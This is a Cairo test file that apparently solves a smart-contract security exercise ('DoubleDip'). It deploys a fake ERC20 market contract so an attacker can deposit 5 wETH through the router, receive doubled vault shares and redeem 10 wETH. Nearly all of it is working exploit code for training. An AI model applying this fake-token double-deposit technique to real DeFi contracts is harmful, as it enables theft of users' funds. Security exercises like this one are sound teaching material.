#[cfg(test)]
mod TestDoubleDip {
    use core::debug::PrintTrait;
    use core::result::ResultTrait;
    use core::option::OptionTrait;
    use core::traits::TryInto;
    use starknet::{contract_address_to_felt252, ContractAddress};
    use snforge_std::{
        declare, ContractClass, ContractClassTrait, start_prank, stop_prank, CheatTarget
    };
    use pharaonik::interfaces::IERC20Camel::{
        IERC20CamelSafeDispatcher, IERC20CamelSafeDispatcherTrait
    };
    use pharaonik::interfaces::ISubDefiRouter::{
        ISubDefiRouterSafeDispatcher, ISubDefiRouterSafeDispatcherTrait
    };
    use pharaonik::interfaces::ISubDefiVault::{
        ISubDefiVaultSafeDispatcher, ISubDefiVaultSafeDispatcherTrait
    };
    use pharaonik::utils::constants::Constants;
    use pharaonik::utils::errors::Errors;
    use pharaonik::setup::setup::Setup::{declare_contract, deploy_contract, fund_tokens};
    use pharaonik::setup::setup_double_dip::SetupDoubleDip::{setup_double_dip};

    #[test]
    #[feature("safe_dispatcher")]
    fn test_exploit() {
        let (wETH_address, router_address, eth_vault_address) = setup_double_dip();
        let SubDefiRouter = ISubDefiRouterSafeDispatcher { contract_address: router_address };
        let SubDefiEthVault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault_address };
        let sub_defi_admin = Constants::sub_defi_admin();

        start_prank(CheatTarget::One(router_address), sub_defi_admin);
        SubDefiRouter.add_market(wETH_address, eth_vault_address).unwrap();
        stop_prank(CheatTarget::One(router_address));

        start_prank(CheatTarget::One(eth_vault_address), sub_defi_admin);
        SubDefiEthVault.update_rate(1000000000000000000).unwrap();
        stop_prank(CheatTarget::One(eth_vault_address));

        attack_action(router_address, wETH_address, eth_vault_address);
        let attacker_final_balance: u256 = IERC20CamelSafeDispatcher {
            contract_address: wETH_address
        }
            .balanceOf(Constants::attacker())
            .unwrap();
        assert(attacker_final_balance == 10000000000000000000, 'Exercise::Error');
        'Excercise Completed!'.print();
    }

    #[feature("safe_dispatcher")]
    fn attack_action(router: ContractAddress, wETH: ContractAddress, eth_vault: ContractAddress) {
        let deposit_amount: u256 = 5000000000000000000; // 5 ETH 
        let attacker = Constants::attacker();
        let Router = ISubDefiRouterSafeDispatcher { contract_address: router };
        let Vault = ISubDefiVaultSafeDispatcher { contract_address: eth_vault };
        let market_id: u32 = 0;

        // Deploy false wETH Market contract
        let mut call_data = ArrayTrait::new();
        call_data.append(contract_address_to_felt252(attacker));
        call_data.append(contract_address_to_felt252(wETH));
        call_data.append(contract_address_to_felt252(eth_vault));
        let false_market_class: ContractClass = declare_contract('FalseERC20');
        let false_market_address: ContractAddress = deploy_contract(false_market_class, call_data);

        start_prank(CheatTarget::One(wETH), attacker);
        let _success: bool = IERC20CamelSafeDispatcher { contract_address: wETH }
            .transfer(false_market_address, deposit_amount)
            .unwrap();
        stop_prank(CheatTarget::One(wETH));

        // Deposit
        start_prank(CheatTarget::One(router), attacker);
        let _deposit_id: u8 = Router
            .deposit_request(market_id, false_market_address, deposit_amount)
            .unwrap();
        stop_prank(CheatTarget::One(router));

        start_prank(CheatTarget::One(eth_vault), attacker);
        let sdETH_balance: u256 = Vault.share_balance(attacker).unwrap();
        stop_prank(CheatTarget::One(eth_vault));
        assert(sdETH_balance == 10000000000000000000, 'Invalid Shares');

        // Redeem 
        start_prank(CheatTarget::One(eth_vault), attacker);
        Vault.approve_share(eth_vault, sdETH_balance).unwrap();
        stop_prank(CheatTarget::One(eth_vault));

        start_prank(CheatTarget::One(router), attacker);
        let _redeem_id: u8 = Router
            .redeem_request(market_id, false_market_address, sdETH_balance)
            .unwrap();
        stop_prank(CheatTarget::One(router));
    }
}

